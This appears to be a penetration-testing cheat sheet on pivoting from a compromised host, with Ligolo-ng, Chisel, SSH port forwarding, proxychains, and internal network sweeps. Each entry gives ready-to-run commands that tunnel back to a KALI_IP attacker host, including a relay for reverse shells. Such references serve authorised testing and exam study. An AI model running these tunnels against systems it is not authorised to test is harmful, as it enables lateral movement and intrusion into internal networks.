title: Ligolo-ng — single pivot setup
inline_answer:
```
# Kali (once):
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert                       # proxy console
# On the compromised host:
./agent -connect KALI_IP:11601 -ignore-cert
# Back in proxy console:
session            # pick the agent
start              # bring the tunnel up
# Kali: route the target subnet through the tun
sudo ip route add 10.10.10.0/24 dev ligolo
```

Reverse shells back: `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444`.

title: SSH port-forward syntax (-L / -D / -R)
inline_answer:
```
ssh -L 8080:127.0.0.1:80 user@PIVOT          # local: reach PIVOT's :80 at Kali:8080
ssh -D 1080 user@PIVOT                       # dynamic SOCKS (proxychains -> :1080)
ssh -R 1080 user@KALI                        # reverse SOCKS from a pivot inward
ssh -R 4444:127.0.0.1:4444 user@KALI         # bring a pivot port back to Kali
```

Add `-fN` to background without a shell. Reverse needs `GatewayPorts` if binding non-loopback.

title: Chisel — reverse SOCKS
inline_answer:
```
# Kali (server):
./chisel server -p 8080 --reverse
# Pivot (client):
./chisel client KALI_IP:8080 R:socks
# Kali: proxychains now uses socks5 127.0.0.1:1080
```

Single port instead of SOCKS: client `R:3389:10.10.10.5:3389`. Use when Ligolo can't (HTTP-only egress / DPI).

title: Pre-pivot — discover the internal network
inline_answer:
On the compromised host:

```
ip -br a ; ip route ; arp -a            # extra NIC / route = pivot candidate
ss -tlnp || netstat -antop              # internal-only listeners (127.x)
for i in $(seq 1 254); do ping -c1 -W1 10.10.20.$i & done; wait   # quick sweep
```

Windows: `ipconfig /all`, `route print`, `arp -a`, `netstat -ano`.

title: Proxychains — usage & limits
inline_answer:
`/etc/proxychains4.conf`: `quiet_mode`, last line `socks5 127.0.0.1 1080`. Run `proxychains -q nmap -sT -Pn -n ...`.

**Limits:** TCP connect only (no SYN/UDP/ICMP — so no `-sU`, ping sweeps fail), slow, some tools break. Prefer Ligolo's TUN (real routing, no proxychains) whenever possible.
